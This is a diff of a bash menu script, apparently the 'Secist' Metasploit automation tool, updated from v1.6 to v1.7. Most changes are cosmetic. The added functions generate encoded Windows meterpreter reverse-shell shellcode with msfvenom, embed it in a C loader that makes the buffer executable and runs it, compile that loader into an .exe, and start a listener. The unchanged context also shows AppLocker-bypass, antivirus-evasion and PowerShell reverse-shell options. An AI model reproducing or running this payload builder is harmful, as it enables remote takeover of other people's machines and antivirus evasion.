@@ -9,8 +9,8 @@
   echo -e '-- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon '
 
   echo -e "/==========================########========================\\"
-  echo -e "|                             # v1.6                       |"
-  echo -e "|                 Secist Anniversary Editionv1.6           |"
+  echo -e "|                             # v1.7                       |"
+  echo -e "|                 Secist Anniversary Editionv1.7           |"
   echo -e "|       #Check the script. Just a moment, please.....      |"
   echo -e "|———————————#—————————————————#——————————————————#—————————|"
   echo -e "|                                            Demon 2017    |"
@@ -25,7 +25,7 @@
   msfconsole='1'
   else
   msfconsole='0'
-  fi 
+  fi
   # check msfvenom
   which msfvenom > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
@@ -79,7 +79,7 @@
   echo -e "|               #My first automated, simple script#        |"
   echo -e "|               ##Secist's blog: www.secist.com            |"
   echo -e "|———————————#—————————————————#——————————————————#—————————|"
-  echo -e "|                Secist Anniversary Editionv1.6 | Demon 2017.7.14    |"
+  echo -e "|                Secist Anniversary Editionv1.7 | Demon 2017.7.14    |"
   echo -e "\==========================================================/"
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "            Your IP address :\c"
@@ -100,9 +100,9 @@
   read number
   case $number in
     1)
-    echo -e "       secist>Enter your IP address: \c"
+    echo -e "       secist> Enter your IP address: \c"
     read ip
-    echo -e "       secist>Enter your port: \c"
+    echo -e "       secist> Enter your port: \c"
     read port
     echo  "################################################################## "
     echo "use exploit/multi/script/web_delivery" >> resource/php.rc
@@ -115,9 +115,9 @@
     msfconsole -r resource/php.rc
         ;;
     2)
-    echo -e "       secist>Enter your IP address: \c"
+    echo -e "       secist> Enter your IP address: \c"
     read ip
-    echo -e "        secist>Enter your port: \c"
+    echo -e "        secist> Enter your port: \c"
     read port
     echo  "################################################################## "
     echo "use exploit/multi/script/web_delivery" >> resource/python.rc
@@ -128,9 +128,9 @@
     msfconsole -r resource/python.rc
         ;;
     3)
-    echo -e "        secist>Enter your IP address: \c"
+    echo -e "        secist> Enter your IP address: \c"
     read ip
-    echo -e "        secist>Enter your port: \c"
+    echo -e "        secist> Enter your port: \c"
     read port
     echo  "################################################################## "
     echo "use exploit/multi/script/web_delivery" >> resource/powershell.rc
@@ -143,9 +143,9 @@
     msfconsole -r resource/powershell.rc
     ;;
     4)
-    echo -e "         secist>Enter your IP address: \c"
+    echo -e "         secist> Enter your IP address: \c"
     read ip
-    echo -e "         secist>Enter your port: \c"
+    echo -e "         secist> Enter your port: \c"
     read port
     echo -e "         secist>Please put the template file to the current directory and enter the name of the file you put in: \c"
     read file
@@ -170,9 +170,9 @@
     fi
     ;;
     5)
-    echo -e "       secist>Enter your IP address: \c"
+    echo -e "       secist> Enter your IP address: \c"
     read ip
-    echo -e "       secist>Enter your port: \c"
+    echo -e "       secist> Enter your port: \c"
     read port
     echo  "################################################################## "
     echo "use exploit/windows/misc/regsvr32_applocker_bypass_server" >> resource/bypass.rc
@@ -189,9 +189,9 @@
      avoidz
        ;;
     8)
-    echo -e "       secist>Enter your IP address: \c"
+    echo -e "       secist> Enter your IP address: \c"
     read ip
-    echo -e "        secist>Enter your port: \c"
+    echo -e "        secist> Enter your port: \c"
     read port
     #Enter IP and port
     cp Invoke-PowerShellTcp.ps1 output/Invoke-PowerShellTcp.ps1
@@ -238,7 +238,7 @@ echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo "  "
 echo -e "  +------------++-------------------------++-----------------------+"
-echo      "             Secist Anniversary Editionv1.6 (secist----2017.7.14)"
+echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
 echo " "
 echo -e "            Your IP address :\c"
 /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
@@ -311,9 +311,9 @@ elif [ "$option" == "6" ]; then
 elif [ "$option" == "7" ]; then
   code
 elif [ "$option" == "8" ]; then
-  echo -e "       secist>Enter your IP address: \c"
+  echo -e "       secist> Enter your IP address: \c"
   read ip
-  echo -e "       secist>Enter your port: \c"
+  echo -e "       secist> Enter your port: \c"
   read port
   echo -e  "        secist>Please enter the name of the file you want to save：\c "
   read output
@@ -342,11 +342,11 @@ clear
 echo -e "_______________________________________________________________________"
 echo -e "    I'm a member of the Secist Team, Demon.I usually active in the BUGBACK, Ichunqiu, and other platforms. Major in web security, Hackintosh and Kali penetration testing, etc. I'm currently concentrating on metaspolit research, and I'd like to share some of my learning ideas and experiences with this tutorial."
 echo -e "    For any questions about the course, you can contact us by the following ways:  "
-echo      "             Secist Anniversary Editionv1.6 (secist----2017.7.14)"
+echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
 echo -e "                     < My Blog: www.ggsec.cn >"
 echo -e "                    < My Team Blog: www.secist.com>"
 echo "                       Secist's QQ group：532925486 "
-echo "                       Welcome to use my script v1.6"
+echo "                       Welcome to use my script v1.7"
 echo "            Ps:Please indicate the author when you change the code             "
 echo "                           Translator ：Sid                   "
 echo -e "---------------------------------------------------------------------- "
@@ -380,9 +380,9 @@ case $number in
 
 code(){
 #Defines a menu called code
-  echo -e "       secist>Enter your IP address: \c"
+  echo -e "       secist> Enter your IP address: \c"
   read ip
-  echo -e "       secist>Enter your port: \c"
+  echo -e "       secist> Enter your port: \c"
   read port
 ./ps1encode.rb -i $ip -p $port -a $payload -t cmd
 #对shellcode 输出
@@ -445,7 +445,7 @@ echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo "  "
 echo -e "  +------------++-------------------------++-----------------------+"
-echo      "             Secist Anniversary Editionv1.6 (secist----2017.7.14)"
+echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
 echo " "
 echo -e "            Your IP address :\c"
 /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
@@ -518,9 +518,9 @@ fi
 }
 code1(){
   rm /root/temp1.exe
-  echo -e "       secist>Enter your IP address: \c"
+  echo -e "       secist> Enter your IP address: \c"
   read ip
-  echo -e "       secist>Enter your port: \c"
+  echo -e "       secist> Enter your port: \c"
   read port
   echo " Please wait a few minutes, your fish will be released.=====================================》"
   echo  "################################################################## "
@@ -554,7 +554,7 @@ echo -e "                                     ||----w |    "
 echo -e "                                     ||     ||     "
 echo " "
 echo -e "  +------------++-------------------------++-----------------------+"
-echo      "             Secist Anniversary Editionv1.6 (secist----2017.7.14)"
+echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
 echo " "
 echo -e "            Your IP address :\c"
 /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
@@ -580,9 +580,9 @@ case $option in
 1)
 
 echo " "
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 #build_win32_meterpreter_rev_https_20xshikata.sh
 . avet/build/global_win32.sh
@@ -612,9 +612,9 @@ echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 2)
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 #build_win32_meterpreter_rev_https_shikata_fopen.sh
 # simple example script for building the .exe file
@@ -652,9 +652,9 @@ echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 3)
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 #build_win32_meterpreter_unstaged_rev_https_20xshikata
 . avet/build/global_win32.sh
@@ -685,9 +685,9 @@ echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 4)
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 #build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
 . avet/build/global_win32.sh
@@ -717,9 +717,9 @@ echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 5)
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 #build_win32_meterpreter_rev_https_fopen_shikata.sh
 . avet/build/global_win32.sh
@@ -749,9 +749,9 @@ msfconsole -r  resource/handler.rc
 ;;
 
 6)
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 #build_win64_meterpreter_rev_tcp_xor
 . avet/build/global_win64.sh
@@ -783,9 +783,9 @@ echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 7)
-echo -e "       secist>Enter your IP address: \c"
+echo -e "       secist> Enter your IP address: \c"
 read ip
-echo -e "       secist>Enter your port: \c"
+echo -e "       secist> Enter your port: \c"
 read port
 # build_win64_meterpreter_rev_tcp_xor_fopen.sh
 . avet/build/global_win64.sh
@@ -829,5 +829,193 @@ echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
 echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
 echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
 echo -e "  +------------++-------------------------++-----------------------+"
+}
+
+shellcode (){
+clear
+
+echo  -e "         < Avet Payload >"
+echo  -e "          --------------------"
+echo -e "                             \   ^__^             "
+echo -e "                              \  (oo)\_______     "
+echo -e "                                 (__)\       )\/\ "
+echo -e "                                     ||----w |    "
+echo -e "                                     ||     ||     "
+echo " "
+echo -e "  +------------++-------------------------++-----------------------+"
+echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
+echo " "
+echo -e "            Your IP address :\c"
+/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
+echo "            System version :$(cat /etc/issue)"
+echo -e "  +------------++-------------------------++-----------------------+"
+echo "  "
+echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
+echo "        [2] Meterpreter_Reverse_http	         [6] exit"
+echo "        [3] Meterpreter_Reverse_https		 "
+echo "        [4] Meterpreter_Reverse_tcp_dns          "
+echo "        [7] back meun     "
+echo ""
+echo -e "              secist> \c"
+read option
+
+#Aukeratu
+case $option in
+1)
+payload='windows/meterpreter/reverse_tcp'
+;;
+2)
+payload='windows/meterpreter/reverse_http'
+;;
+3)
+payload='windows/meterpreter/reverse_https'
+;;
+4)
+payload='windows/meterpreter/reverse_tcp_dns'
+;;
+5)
+payload='windows/shell/reverse_tcp'
+;;
+6)
+exit
+;;
+7)
+menu
+;;
+*)
+shellcode
+;;
+esac
+if [ "$option" == "1" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "2" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "3" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "4" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+elif [ "$option" == "5" ]; then
+  shellcode1
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | Name       ||  Descript   	          || Your Input             "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
+   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
+   echo -e "  | OUTPUTNAME ||  The Filename output    || output/shellcode.exe   "
+   echo -e "  +------------++-------------------------++-----------------------+"
+   echo "use exploit/multi/handler" >> resource/handler.rc
+   echo "set PAYLOAD $payload" >> resource/handler.rc
+   echo "set LHOST $ip" >>  resource/handler.rc
+   echo "set LPORT $port" >>  resource/handler.rc
+   echo "exploit " >>  resource/handler.rc
+   msfconsole -r  resource/handler.rc
+
+ elif [ "$option" == "6" ]; then
+    exit
+
+ elif [ "$option" == "7" ]; then
+    menu
+  fi
+}
+
+shellcode1(){
+#定义了一个菜单为shellcode1
+  echo -e "       secist> Enter your IP address: \c"
+  read ip
+  echo -e "       secist> Enter your port: \c"
+  read port
+  echo -e "       secist> Enter the number of iterations(1-500): \c"
+  read encode
+  echo  $( msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=$ip  LPORT=$port -e x86/shikata_ga_nai -b '\x00' -i $encode -f c) | sed 's/unsigned char buf\[\] =//g' >> output/shellcode.txt
+  Shellcode=$(cat output/shellcode.txt)
+  echo  "
+  # include <stdlib.h>
+  # include <stdio.h>
+  # include <string.h>
+
+  # include <windows.h>
+
+
+  int
+  main(void)
+  {
+  	char *shellcode =
+
+    $Shellcode
+
+
+  	DWORD why_must_this_variable;
+  	BOOL ret = VirtualProtect(shellcode, strlen(shellcode),
+  		PAGE_EXECUTE_READWRITE, &why_must_this_variable);
+
+  	if (!ret) {
+  		printf(\"VirtualProtect\n\");
+  		return EXIT_FAILURE;
+  	}
+  	((void(*)(void))shellcode)();
+
+  	return 0;
+  }
+
+  " >> output/shellcode.cpp
+
+  wine gcc -m32 -W -Wall -o output/shellcode.exe output/shellcode.cpp
+  rm output/shellcode.txt output/shellcode.cpp
 }
 menu
